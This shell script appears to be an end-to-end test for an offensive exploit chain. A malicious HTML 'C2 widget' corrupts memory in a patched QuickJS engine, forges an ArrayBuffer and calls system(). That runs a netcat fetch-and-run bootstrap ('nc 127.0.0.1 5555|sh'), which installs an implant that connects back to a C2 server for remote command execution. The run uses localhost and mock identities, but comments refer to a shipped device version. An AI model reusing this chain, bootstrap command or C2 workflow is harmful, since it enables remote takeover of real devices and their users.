#!/bin/sh
# Host end-to-end: the real C2 widget -> system(bootstrap) -> loader ->
# mock implant -> control session -> exec.
#
# No phone, no emulator, no internet.  The default widget is the C2 host twin
# (device/widget/c2560_final_c2560s_c2_host.html): same stage A/C and the same
# 44-char command as the shipped device widget, with the host-calibrated
# endgame.  The shipped device widget stops at HF ERR NOANCHOR on the host by
# design.  The harness (run_sib_plain) is the app-like sibling-script engine,
# and JS_FreeRuntime triggers the patched free -> system(cmd) exactly like the
# device teardown.  The server serves a MOCK bootstrap (writes into a temp dir
# and fake identity) so nothing touches /data.
#
# The widget's 50-byte command is hard-wired to 127.0.0.1:5555 (loader) and
# the implant dials 127.0.0.1:4444 (control); the test therefore uses those
# ports.  Set C2_WIDGET_PORT/C2_WIDGET_LOADER_PORT only together with a
# rebuilt widget.
#
# Usage:  ./run_widget_e2e.sh [widget.html]
#         C2_WIDGET_TEST_DIR=/tmp/opencode/wtest ./run_widget_e2e.sh
#
# Exit 0 = all checks passed.
set -eu

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
PY=${PYTHON:-python3}
TREE=$(CDPATH= cd -- "$ROOT/../lab/qjs_fork_audit/zeroday_hunt_parser" && pwd)
HARNESS=${C2_WIDGET_HARNESS:-$TREE/build/run_sib_plain}
# The device stage B is calibrated for the device heap and stops at
# HF ERR NOANCHOR on the host by design (the repo keeps a host twin for
# host proof).  The C2 host twin carries the same stage A/C and the exact
# same 44-char command; it is the correct host validation vehicle.
WIDGET=${1:-$TREE/device/widget/c2560_final_c2560s_c2_host.html}
PORT=${C2_WIDGET_PORT:-4444}
LPORT=${C2_WIDGET_LOADER_PORT:-5555}
TOKEN="widget-e2e-$$"
WORK=${C2_WIDGET_TEST_DIR:-$(mktemp -d "${TMPDIR:-/tmp}/c2widget.XXXXXX")}
mkdir -p "$WORK"

PASS=0
FAIL=0
say() { printf '%s\n' "$*"; }
ok() { PASS=$((PASS + 1)); say "  ok: $*"; }
bad() { FAIL=$((FAIL + 1)); say "  FAIL: $*"; }
check_grep() {
    if grep -q -- "$2" "$1" 2>/dev/null; then ok "$3"; else bad "$3 (pattern: $2)"; fi
}

[ -f "$WIDGET" ] || { echo "run_widget_e2e: missing widget $WIDGET" >&2; exit 2; }
[ -x "$HARNESS" ] || { echo "run_widget_e2e: missing harness $HARNESS" >&2; exit 2; }

EXPECT_CMD="setsid sh -c 'sleep 5|nc 127.0.0.1 $LPORT|sh'&"
LIT=$("$PY" - "$WIDGET" <<'PY'
import re, sys
html = open(sys.argv[1], encoding="utf-8").read()
m = re.search(r'=0;\w+<\d+;\w+\+\+\)\w+\[\w+\]=255&"([^"]*)"', html)
print(m.group(1).rstrip() if m else "")
PY
)
if [ "$LIT" = "$EXPECT_CMD" ]; then
    ok_lit=1
else
    echo "run_widget_e2e: embedded command is not the expected bootstrap:" >&2
    echo "  got:  '$LIT'" >&2
    echo "  want: '$EXPECT_CMD'" >&2
    exit 2
fi

# Fail early if the fixed ports are taken (the widget cannot be repointed).
if "$PY" - "$PORT" "$LPORT" <<'PY'
import socket, sys
for p in map(int, sys.argv[1:]):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("127.0.0.1", p))
    except OSError:
        print(p)
        raise SystemExit(1)
    finally:
        s.close()
PY
then :; else
    echo "run_widget_e2e: control/loader port busy; free $PORT/$LPORT first" >&2
    exit 2
fi

cleanup() {
    [ -f "$WORK/server.pid" ] && kill "$(cat "$WORK/server.pid")" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

mkdir -p "$WORK/loader"
cat > "$WORK/batch.txt" <<EOF
wait 40 1
sessions
exec echo WIDGET_BOOT_OK
exec id
bye stop
quit
EOF

"$PY" "$ROOT/server/c2_server.py" \
    --host 127.0.0.1 --port "$PORT" --loader-port "$LPORT" \
    --bootstrap nc \
    --loader-mock-dir "$WORK/loader" --token "$TOKEN" \
    --log-dir "$WORK/logs" --download-dir "$WORK/dl" \
    --script "$WORK/batch.txt" > "$WORK/server.out" 2>&1 &
echo $! > "$WORK/server.pid"

i=0
while ! grep -q "loader listening" "$WORK/server.out" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done
check_grep "$WORK/server.out" "loader listening" "server listening"
check_grep "$WORK/server.out" "bootstrap: setsid sh -c 'sleep 5|nc 127.0.0.1 $LPORT|sh'&" "logged short bootstrap"

say "== widget run: $(basename "$WIDGET") =="
# 8 MiB runtime limit = the app's limit; the teardown free runs system(cmd).
"$HARNESS" -l 8 -t 60000 "$WIDGET" "$WORK/vdom.txt" > "$WORK/harness.out" 2>&1 || true
say "--- harness ---"
cat "$WORK/harness.out"
say "--------------"

check_grep "$WORK/harness.out" "RESULT ABLEN\[599\]=327744 VLEN=327744" "stage A forged AB 327744"
check_grep "$WORK/harness.out" "HF OK" "stage B anchors + system resolved"

i=0
while kill -0 "$(cat "$WORK/server.pid")" 2>/dev/null && [ "$i" -lt 120 ]; do
    sleep 0.5
    i=$((i + 1))
done
if kill -0 "$(cat "$WORK/server.pid")" 2>/dev/null; then
    bad "server did not exit (no session?)"
    kill -9 "$(cat "$WORK/server.pid")" 2>/dev/null || true
fi

check_grep "$WORK/server.out" "loader: serving" "loader served the bootstrap"
check_grep "$WORK/server.out" "hello implant=" "implant hello on 4444"
check_grep "$WORK/server.out" "WIDGET_BOOT_OK" "exec stdout through the widget chain"
check_grep "$WORK/server.out" "uid=" "exec id through the widget chain"
check_grep "$WORK/server.out" "Mock-Device" "mock identity (host-only run)"
if [ -f "$WORK/loader/implant.sh" ] && [ -f "$WORK/loader/supervisor.sh" ]; then
    ok "bootstrap wrote implant.sh + supervisor.sh"
else
    bad "bootstrap did not write the implant scripts"
fi
if [ -f "$WORK/loader/stop" ]; then ok "implant stopped cleanly"; else bad "no stop marker"; fi

say ""
say "work dir: $WORK"
say "session log: $(ls -d "$WORK"/logs/run-* 2>/dev/null | head -1)"
if [ "$FAIL" -eq 0 ]; then
    say "PASS ($PASS checks)"
    exit 0
fi
say "FAIL ($FAIL failed, $PASS passed)"
exit 1
